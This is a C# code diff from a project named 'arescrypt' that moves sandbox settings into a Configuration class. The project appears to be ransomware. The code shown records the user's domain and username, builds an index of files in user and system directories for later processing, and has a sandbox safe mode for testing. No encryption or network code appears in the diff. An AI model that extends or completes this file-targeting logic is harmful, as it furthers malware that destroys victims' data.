@@ -11,11 +11,7 @@ namespace arescrypt
         // Predefinitions
         public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
         public static string sessionUsername = Environment.UserName; // get current sessions username
-        public static string currentWorkingDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
-
-        public static bool sandBox = true; // Safemode for testing/debugging
-        public static string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
-
+        
         static void Main(string[] args)
         {
             // Welcome message
@@ -25,19 +21,19 @@ namespace arescrypt
 #else
             Console.Write(". RELEASE mode has been enabled.\n");
 #endif
-            Console.WriteLine("Current path is: " + currentWorkingDirectory + "\n");
+            Console.WriteLine("Current path is: " + Configuration.currentWorkingDirectory + "\n");
             // End welcome message
 
             var userSpecificDirs = new List<string> { "" };
             var systemSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
 
-            if (sandBox) // == true
-                if (Directory.Exists(sandBoxDirectory))
-                    userSpecificDirs.Add(sandBoxDirectory);
+            if (Configuration.sandBox) // == true
+                if (Directory.Exists(Configuration.sandBoxDirectory))
+                    userSpecificDirs.Add(Configuration.sandBoxDirectory);
                 else
-                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + sandBoxDirectory);
-            else if (!sandBox)
+                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + Configuration.sandBoxDirectory);
+            else if (!Configuration.sandBox)
             {
                 /*
                 // User specific directories, administrative rights shouldn't be required in order to write to these files
@@ -60,9 +56,9 @@ namespace arescrypt
             foreach (string dir in userSpecificDirs)
                 foreach (string file in FileHandler.DirSearch(dir))
                     userSpecificFiles.Add(file);
-            if (sandBox) // == true
+            if (Configuration.sandBox) // == true
                 fullFileIndex = userSpecificFiles.ToArray();
-            else if (!sandBox) // == false
+            else if (!Configuration.sandBox) // == false
             {   // Get file index from both Lists' and spawn a Full File Index of all files in every subdirectory
                 foreach (string dir in systemSpecificDirs)
                     foreach (string file in FileHandler.DirSearch(dir))
@@ -72,10 +68,10 @@ namespace arescrypt
 
             foreach (string file in fullFileIndex)
                 Console.WriteLine(file);
-            
+
             // Exiting message
             // Console.Write("\nPress any key to continue . . . ");
-
+            
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Display());
